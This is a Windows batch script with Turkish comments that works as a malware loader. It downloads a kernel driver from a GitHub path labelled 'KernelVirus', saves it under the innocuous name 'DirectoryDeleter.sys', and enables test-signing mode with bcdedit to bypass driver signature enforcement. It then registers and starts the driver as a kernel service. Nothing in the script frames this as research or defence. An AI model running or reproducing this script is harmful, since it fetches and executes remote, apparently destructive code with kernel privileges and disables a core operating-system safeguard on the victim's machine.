@echo off
:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] This script must be run as administrator!
    echo Please restart the script with administrative privileges.
    pause
    exit /b
)

:: GitHub'dan .sys dosyasını indirme
set "GITHUB_URL=https://raw.githubusercontent.com/ErrorCode0000/-/main/KernelVirus/KrnlVrs.sys"
set "OUTPUT_PATH=%~dp0DirectoryDeleter.sys"

echo [INFO] Downloading .sys file from GitHub...
powershell -Command "Invoke-WebRequest -Uri %GITHUB_URL% -OutFile '%OUTPUT_PATH%'"
if not exist "%OUTPUT_PATH%" (
    echo [ERROR] Failed to download the .sys file. Please check the GitHub URL.
    pause
    exit /b
)

echo [INFO] .sys file downloaded successfully: %OUTPUT_PATH%

:: Test modunu etkinleştirme
echo [INFO] Enabling Test Mode...
bcdedit /set testsigning on
if %errorlevel% neq 0 (
    echo [ERROR] Failed to enable Test Mode. Please check your system configuration.
    pause
    exit /b
)

echo [INFO] Test Mode enabled successfully.

:: Sürücüyü yükleme
set "DRIVER_NAME=MyDriver"
echo [INFO] Creating and starting the driver service...

sc create %DRIVER_NAME% type= kernel binPath= "%OUTPUT_PATH%"
if %errorlevel% neq 0 (
    echo [ERROR] Failed to create the driver service. Please check the .sys file and try again.
    pause
    exit /b
)

sc start %DRIVER_NAME%
if %errorlevel% neq 0 (
    echo [ERROR] Failed to start the driver service. Please check the driver and try again.
    pause
    exit /b
)

echo [INFO] Driver service created and started successfully.

:: Kullanıcıyı bilgilendirme
echo [INFO] The system needs to be restarted for the changes to take effect.
echo Please restart your computer manually.
pause
exit /b
